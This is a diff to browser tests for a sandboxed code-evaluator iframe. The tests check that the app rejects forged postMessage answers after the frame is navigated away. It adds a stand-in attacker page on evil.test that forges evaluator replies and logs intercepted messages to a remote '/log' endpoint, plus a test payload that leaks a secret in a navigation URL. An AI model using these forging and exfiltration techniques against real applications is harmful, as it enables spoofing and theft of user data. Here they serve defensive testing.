@@ -28,11 +28,29 @@ const enabled = node.env.FXM_BROWSER === '1'
 
 const APP = 'https://fxm.test'
 const OTHER = 'https://other.test'
+const EVIL = 'https://evil.test'
 const YOUTUBE = 'https://www.youtube.com'
+
+/**
+ * A page that replaces the evaluator in its frame: it forges a hello and answers for the first
+ * ids, and reports every message it gets to `/log`.
+ */
+const FORGE_PAGE = `<!doctype html><title>forge</title><script>
+  const log = (what) => fetch('${EVIL}/log?' + encodeURIComponent(JSON.stringify(what)), { mode: 'no-cors' })
+  addEventListener('message', (event) => log({ got: event.data }))
+  const channel = new MessageChannel()
+  channel.port1.onmessage = (event) => log({ gotOnPort: event.data })
+  parent.postMessage({ channel: '${EVALUATOR_CHANNEL}', type: 'ready', version: 2, origin: '${APP}' }, '*', [channel.port2])
+  for (let id = 0; id < 50; id += 1) {
+    parent.postMessage({ channel: '${EVALUATOR_CHANNEL}', id, ok: true, result: 'forged' }, '*')
+  }
+</script>`
 
 describe.skipIf(!enabled)('eval.html in Chromium', { timeout: 60_000 }, () => {
   let browser: Browser
   let context: BrowserContext
+  /** What reached the forge page's `/log`, and every URL requested on evil.test. */
+  const evilRequests: string[] = []
 
   beforeAll(async () => {
     const { chromium } = await import('playwright-core')
@@ -66,6 +84,14 @@ describe.skipIf(!enabled)('eval.html in Chromium', { timeout: 60_000 }, () => {
         return route.fulfill({ status: 200, contentType: 'application/json', body: '{"secret":1}' })
       }
       if (url.href === `${OTHER}/`) return page('<!doctype html><title>other</title>')
+      if (url.origin === EVIL) {
+        evilRequests.push(url.href)
+        if (url.pathname === '/top.html') {
+          return page(`<!doctype html><title>top</title><iframe src="${APP}/app/"></iframe>`)
+        }
+        if (url.pathname === '/forge.html') return page(FORGE_PAGE)
+        return route.fulfill({ status: 204, body: '' })
+      }
       // Android's evaluator WebView loads the document with this base URL.
       if (url.href === `${YOUTUBE}/`) return page(html)
       return route.abort()
@@ -98,7 +124,7 @@ describe.skipIf(!enabled)('eval.html in Chromium', { timeout: 60_000 }, () => {
       return { info, sum, origin, keyed }
     })
     expect(result).toEqual({
-      info: { kind: 'web', version: 1, origin: APP },
+      info: { kind: 'web', version: 2, origin: APP },
       sum: 42,
       origin: 'null',
       keyed: 42,
@@ -179,6 +205,86 @@ describe.skipIf(!enabled)('eval.html in Chromium', { timeout: 60_000 }, () => {
     expect(answers).toEqual([])
   })
 
+  it('stops a document that its own script navigates, and never takes answers from the new page', async () => {
+    evilRequests.length = 0
+    const page = await app()
+    const result = await page.evaluate(async () => {
+      const { createSandboxEvaluator } = (
+        globalThis as never as {
+          fxmTest: typeof import('./web')
+        }
+      ).fxmTest
+      const evaluator = createSandboxEvaluator()
+      await evaluator.evaluate('return 1')
+      const outcome = await evaluator
+        .evaluate(
+          'location.href = "https://evil.test/forge.html?leak=" + args.secret; await new Promise(() => {})',
+          { secret: 'video-123' },
+        )
+        .then(
+          (value) => ({ value }),
+          (error: { evaluatorCode?: string; message?: string }) => ({
+            failure: error.evaluatorCode,
+            message: error.message,
+          }),
+        )
+      // The next calls go to a new document, with secrets the forge page must never see.
+      const after = await evaluator.evaluate('return self.origin + " " + args', 'integrity-token-1')
+      const frames = document.querySelectorAll('iframe').length
+      evaluator.dispose()
+      return { outcome, after, frames }
+    })
+    expect(result).toEqual({
+      outcome: { failure: 'closed', message: expect.stringContaining('replaced') },
+      after: 'null integrity-token-1',
+      frames: 1,
+    })
+    // A policy can't stop a document navigating itself, so its URL did carry data out; but the
+    // forge page got nothing after it, on the window or on a channel of its own.
+    expect(evilRequests.some((url) => url.includes('leak=video-123'))).toBe(true)
+    expect(evilRequests.filter((url) => url.includes('/log'))).toEqual([])
+  })
+
+  it('stops a document that an ancestor page navigates, and never takes answers from the new page', async () => {
+    evilRequests.length = 0
+    const top = await context.newPage()
+    await top.goto(`${EVIL}/top.html`)
+    const appFrame = top.frames().find((frame) => frame.url() === `${APP}/app/`)
+    if (appFrame === undefined) throw new Error('The app page did not load in the frame')
+    await appFrame.waitForFunction(() => 'fxmTest' in globalThis)
+    await appFrame.evaluate(async () => {
+      const { createSandboxEvaluator } = (
+        globalThis as never as {
+          fxmTest: typeof import('./web')
+        }
+      ).fxmTest
+      const evaluator = createSandboxEvaluator()
+      ;(globalThis as never as { evaluator: unknown }).evaluator = evaluator
+      await evaluator.ready()
+    })
+    // The page on another site navigates the evaluator's frame, which ancestors may do.
+    await top.evaluate(() => {
+      const evaluatorFrame = window.frames[0]?.frames[0]
+      if (evaluatorFrame !== undefined)
+        evaluatorFrame.location.href = 'https://evil.test/forge.html'
+    })
+    // The app notices the second load and removes the frame.
+    await appFrame.waitForFunction(() => document.querySelectorAll('iframe').length === 0)
+    const result = await appFrame.evaluate(async () => {
+      const evaluator = (
+        globalThis as never as {
+          evaluator: import('./evaluator').Evaluator
+        }
+      ).evaluator
+      const value = await evaluator.evaluate('return args', 'song-the-user-plays')
+      evaluator.dispose()
+      return value
+    })
+    expect(result).toBe('song-the-user-plays')
+    expect(evilRequests.some((url) => url.endsWith('/forge.html'))).toBe(true)
+    expect(evilRequests.filter((url) => url.includes('/log'))).toEqual([])
+  })
+
   it('exposes the mailbox when a native webview loads it by itself', async () => {
     const page = await context.newPage()
     await page.goto(`${YOUTUBE}/`)
@@ -207,7 +313,7 @@ describe.skipIf(!enabled)('eval.html in Chromium', { timeout: 60_000 }, () => {
       return { hello: JSON.parse(mailbox.hello), accepted, answer: JSON.parse(answer ?? 'null') }
     }, EVALUATOR_CHANNEL)
     expect(result).toEqual({
-      hello: { channel: EVALUATOR_CHANNEL, type: 'ready', version: 1, origin: YOUTUBE },
+      hello: { channel: EVALUATOR_CHANNEL, type: 'ready', version: 2, origin: YOUTUBE },
       accepted: 'accepted',
       answer: { channel: EVALUATOR_CHANNEL, id: 3, ok: true, result: YOUTUBE },
     })
